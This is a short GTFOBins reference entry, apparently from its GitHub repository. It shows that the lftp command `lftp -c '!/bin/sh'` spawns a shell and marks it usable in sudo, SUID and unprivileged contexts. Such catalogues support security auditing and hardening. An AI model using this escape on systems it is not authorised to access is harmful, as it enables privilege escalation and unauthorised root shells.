<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/lftp -->
---
functions:
  shell:
  - code: |-
      lftp -c '!/bin/sh'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
